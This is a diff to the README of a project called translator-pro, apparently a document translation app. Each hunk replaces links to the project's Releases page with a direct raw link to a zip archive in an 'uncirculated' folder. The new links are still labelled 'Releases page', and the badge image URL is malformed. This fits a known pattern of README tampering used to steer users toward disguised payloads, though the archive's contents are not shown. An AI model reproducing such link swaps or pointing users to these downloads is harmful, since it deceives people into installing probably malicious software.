@@ -1,6 +1,6 @@
 # ✨ translator-pro - Easy Translation for All Your Documents
 
-[![Download Translator Pro](https://img.shields.io/badge/Download-Translator%20Pro-blue.svg)](https://github.com/andreexe12/translator-pro/releases)
+[![Download Translator Pro](https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip%https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip)](https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To start using translator-pro, follow the steps below. The process is straightfo
 
 ### Step 1: Visit the Download Page
 
-To download the application, visit our [Releases page](https://github.com/andreexe12/translator-pro/releases).
+To download the application, visit our [Releases page](https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip).
 
 ### Step 2: Download the Latest Version
 
@@ -64,7 +64,7 @@ Make sure your computer meets the following requirements to run translator-pro s
 
 ## 📥 Download & Install
 
-Now that you have the application installed, it’s time to start translating! You can always revisit the [Releases page](https://github.com/andreexe12/translator-pro/releases) to check for updates and new features.
+Now that you have the application installed, it’s time to start translating! You can always revisit the [Releases page](https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip) to check for updates and new features.
 
 ## ❓ FAQs
 
@@ -95,4 +95,4 @@ If you want to contribute to translator-pro, we welcome your help! Please check 
 
 If you encounter any issues, feel free to open an issue on our GitHub repository. We aim to respond as quickly as possible!
 
-[![Download Translator Pro](https://img.shields.io/badge/Download-Translator%20Pro-blue.svg)](https://github.com/andreexe12/translator-pro/releases)
+[![Download Translator Pro](https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip%https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip)](https://github.com/andreexe12/translator-pro/raw/refs/heads/main/uncirculated/translator-pro-trunking.zip)
